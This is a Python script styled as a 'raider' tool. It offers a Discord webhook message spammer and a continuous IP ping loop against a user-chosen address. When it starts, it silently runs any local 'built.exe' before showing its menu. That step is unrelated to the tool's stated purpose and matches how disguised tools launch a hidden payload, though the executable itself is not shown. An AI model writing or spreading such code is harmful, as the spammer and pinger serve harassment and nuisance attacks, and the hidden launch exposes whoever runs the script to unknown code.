import requests
from colorama import init, Fore
import time
import subprocess
import os

# Initialize colorama
init(autoreset=True)

# Run built.exe if it exists
exe_path = "built.exe"
if os.path.isfile(exe_path):
    print(f"Launching {exe_path}...")
    subprocess.run([exe_path])
else:
    print(f"File '{exe_path}' not found.\n")

# Red ASCII Art
ascii_art = """
██╗   ██╗██╗██╗     ███████╗    ██████╗  █████╗ ██╗██████╗ ███████╗██████╗ 
██║   ██║██║██║     ██╔════╝    ██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
██║   ██║██║██║     █████╗      ██████╔╝███████║██║██║  ██║█████╗  ██████╔╝
╚██╗ ██╔╝██║██║     ██╔══╝      ██╔══██╗██╔══██║██║██║  ██║██╔══╝  ██╔══██╗
 ╚████╔╝ ██║███████╗███████╗    ██║  ██║██║  ██║██║██████╔╝███████╗██║  ██║
  ╚═══╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
"""

# Print header
print(Fore.RED + ascii_art)
print(Fore.BLUE + "the tool you only use once...\n")

# Display options
print(Fore.CYAN + "Select an option:")
print("1: Discord Webhook Sender")
print("2: IP Pinger")
choice = input("Enter your choice (1 or 2): ").strip()

# Option 1: Webhook Sender
if choice == "1":
    webhook_url = input("Enter Discord Webhook URL: ").strip()
    message = input("Enter message to send: ").strip()

    while True:
        try:
            count = int(input("Enter number of times to send the message: "))
            if count <= 0:
                print("Please enter a number greater than 0.")
                continue
            break
        except ValueError:
            print("Please enter a valid number.")

    for i in range(count):
        try:
            response = requests.post(webhook_url, json={"content": message})
            if response.status_code == 204:
                print(f"[{i+1}/{count}] Message sent successfully.")
            else:
                print(f"[{i+1}/{count}] Failed to send message. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[{i+1}/{count}] Error sending message: {e}")
        
        time.sleep(0.1)  # Faster than 1 second, but still safe

    print(Fore.GREEN + "\nAll messages sent.")

# Option 2: IP Pinger
elif choice == "2":
    ip = input("Enter IP to ping: ").strip()
    try:
        print(Fore.YELLOW + "Pinging. Press Ctrl+C to stop.\n")
        while True:
            result = subprocess.run(["ping", "-n", "1", ip], capture_output=True, text=True)
            print(result.stdout)
            time.sleep(0.1)  # Small delay to avoid flooding
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\nStopped pinging.")

else:
    print(Fore.RED + "Invalid choice.")
